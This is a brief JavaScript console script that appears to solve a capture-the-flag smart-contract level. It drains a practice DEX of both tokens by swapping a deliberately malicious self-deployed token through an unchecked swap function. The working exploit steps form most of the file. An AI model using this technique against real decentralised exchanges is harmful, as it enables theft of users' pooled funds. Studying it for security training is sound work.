//set some variables as a shortcut
let token1 = await contract.token1()
let token2 = await contract.token2()

//confirm token balance of player (10 of each)
(await contract.balanceOf(token1, player)).toString()
(await contract.balanceOf(token2, player)).toString()

//confirm token balance of dex (100 of each)
(await contract.balanceOf(token1, contract.address)).toString()
(await contract.balanceOf(token2, contract.address)).toString()

//deploy a malicious token contract (Level23)
//send 1 token from the contract to the dex using remix
//approve the dex to spend 2 of the new token using remix


let newToken = "0x449c3e43255E00E1459985089a3B4c7870727117";

//now swap 1 level 23 token for all token1 of the dex 
await contract.swap(newToken, token1, 1)

//verify dex has been drained of token1
(await contract.balanceOf(token1, contract.address)).toString()


//send 1 token from the contract to the dex using remix


//now swap 1 level 23 token for all token2 of the dex 
await contract.swap(newToken, token2, 1)

//submit level